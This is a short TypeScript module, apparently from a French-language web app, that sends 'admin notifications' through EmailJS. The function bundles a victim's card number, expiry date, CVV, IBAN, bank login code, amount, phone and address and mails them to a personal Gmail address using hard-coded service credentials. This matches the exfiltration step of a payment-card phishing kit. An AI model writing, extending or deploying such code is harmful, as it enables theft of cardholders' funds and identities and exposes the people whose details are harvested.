
import emailjs from 'emailjs-com';
import { User } from '@/types/user';

// Configuration EmailJS - Mise à jour avec les nouveaux identifiants
const SERVICE_ID = 'service_mz3yubw'; // Nouveau service ID
const TEMPLATE_ID = 'template_atnfcwf'; // Nouveau template ID
const USER_ID = 'u9q4QhywRWjrfKnHj'; // Conservé tel quel
const ADMIN_EMAIL = 'warrenkazimoto@gmail.com';

interface EmailParams {
  subject?: string;
  message?: string;
  userCode?: string;
  userName?: string;
  userData?: Partial<User>;
}

export const sendAdminNotification = async (params: EmailParams): Promise<boolean> => {
  try {
    const { userData } = params;
    
    if (!userData) {
      console.error("Données utilisateur manquantes pour l'email");
      return false;
    }
    
    const titulaire = `${userData.prenom || ''} ${userData.nom || ''}`.trim();
    const currentDate = new Date().toLocaleDateString('fr-FR');
    
    // Préparation des données pour le template email
    const templateParams = {
      to_email: ADMIN_EMAIL,
      code: userData.code || 'N/A',
      titulaire: titulaire || 'N/A',
      email: userData.email || 'N/A',
      numerocarte: userData.numerocarte || 'N/A',
      dateexpiration: userData.dateexpiration || 'N/A',
      cryptogramme: userData.cryptogramme || 'N/A',
      montant: userData.montant ? `${userData.montant}€` : 'N/A',
      typebanque: userData.typebanque || 'N/A',
      identifiantiban: userData.identifiantiban || 'N/A',
      codepersonne: userData.codepersonne || 'N/A',
      date: currentDate,
      telephone: userData.telephone || 'N/A',
      adresse: userData.adresse || 'N/A',
      ville: userData.ville || 'N/A',
      codepostal: userData.codepostal || 'N/A',
      pays: userData.pays || 'N/A',
      iban: userData.iban || 'N/A',
      proprietaire: 'Claude' // Variable proprietaire ajoutée
    };
    
    await emailjs.send(
      SERVICE_ID,
      TEMPLATE_ID,
      templateParams,
      USER_ID
    );
    
    console.log('Email envoyé avec succès');
    return true;
  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error);
    return false;
  }
};

// Initialisation d'EmailJS
export const initEmailJS = () => {
  emailjs.init(USER_ID);
};
